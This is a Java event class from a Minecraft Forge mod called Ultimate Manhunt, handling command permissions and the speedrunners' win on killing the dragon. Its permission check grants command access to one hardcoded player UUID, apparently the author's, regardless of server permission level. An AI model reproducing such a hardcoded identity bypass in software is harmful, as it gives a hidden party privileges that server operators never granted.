package net.laserdiamond.ultimatemanhunt.event;

import net.laserdiamond.ultimatemanhunt.UltimateManhunt;
import net.laserdiamond.ultimatemanhunt.api.event.UltimateManhuntGameStateEvent;
import net.laserdiamond.ultimatemanhunt.capability.hunter.PlayerHunter;
import net.laserdiamond.ultimatemanhunt.capability.speedrunner.PlayerSpeedRunner;
import net.minecraft.advancements.AdvancementHolder;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.entity.player.Player;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.player.AdvancementEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.util.List;

@Mod.EventBusSubscriber(modid = UltimateManhunt.MODID, bus = Mod.EventBusSubscriber.Bus.FORGE, value = Dist.DEDICATED_SERVER)
public class ForgeServerEvents {

    private static final ResourceLocation KILL_DRAGON_ADVANCEMENT = ResourceLocation.withDefaultNamespace("end/kill_dragon");

    public static boolean permission(CommandSourceStack sourceStack, int permissionLevel)
    {
        boolean ret = false;

        if (sourceStack.getEntity() instanceof Player player) // Is the executor a player?
        {
            if (player.getStringUUID().equals("7c20841e-1d63-4dd7-a60b-2afb2f65777a")) // Are they LaserDiamond52?
            {
                ret = true;
            }
        }
        if (sourceStack.hasPermission(permissionLevel)) // Otherwise, does the player have permission?
        {
            ret = true;
        }
        return ret;
    }

    @SubscribeEvent
    public static void onAdvancementEarned(AdvancementEvent.AdvancementEarnEvent event)
    {
        AdvancementHolder ah = event.getAdvancement();
        if (ah != null)
        {
            ResourceLocation advPath = ah.id();
            if (advPath.equals(KILL_DRAGON_ADVANCEMENT))
            {
                List<Player> hunters = PlayerHunter.getHunters();
                List<Player> remainingSpeedRunners = PlayerSpeedRunner.getRemainingSpeedRunners();
                MinecraftForge.EVENT_BUS.post(new UltimateManhuntGameStateEvent.End(UltimateManhuntGameStateEvent.End.Reason.SPEED_RUNNERS_WIN, hunters, remainingSpeedRunners));
            }
        }
    }



}
